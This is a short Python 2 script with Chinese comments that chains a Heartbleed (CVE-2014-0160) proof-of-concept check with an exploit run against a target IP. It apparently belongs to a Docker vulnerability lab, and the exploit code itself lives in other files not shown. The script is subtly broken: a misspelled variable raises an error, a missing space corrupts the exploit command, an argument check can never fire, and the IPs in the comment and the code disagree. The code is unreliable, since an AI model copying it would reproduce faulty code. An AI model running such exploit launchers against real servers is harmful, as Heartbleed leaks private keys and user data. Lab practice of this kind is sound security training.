#!/usr/bin/env python
# -*- coding:utf-8 -*
#python version 2.7.14
#通过docker run -d -p 443:443 medicean/vulapps:o_openssl_heartbleed启动环境
#具体参见github地址：https://github.com/Medicean/VulApps/tree/master/o/openssl/heartbleed_CVE-2014-0160
#此处ip为192.168.109.142


import os
import sys

argc = len(sys.argv) - 1
argv = sys.argv[1:]
if argc == -1 or argc > 1:
        print "用法：python",sys.argv[0],"IP地址"
        print "例如：url为http://127.0.0.1/，则IP地址应为127.0.0.1"
        sys.exit()


ip = "192.168.109.147"

if argc >= 1:
    ip = argv[0]
    
os.chdir("Desktop")
commend="python poc.py"
r=os.popen(command)
info=r.read()
re="Heartbleed OpenSSL"
if re in info:
    c="python exp.py"+ip
    re=os.popen(c)
    os.system("cat result.txt")
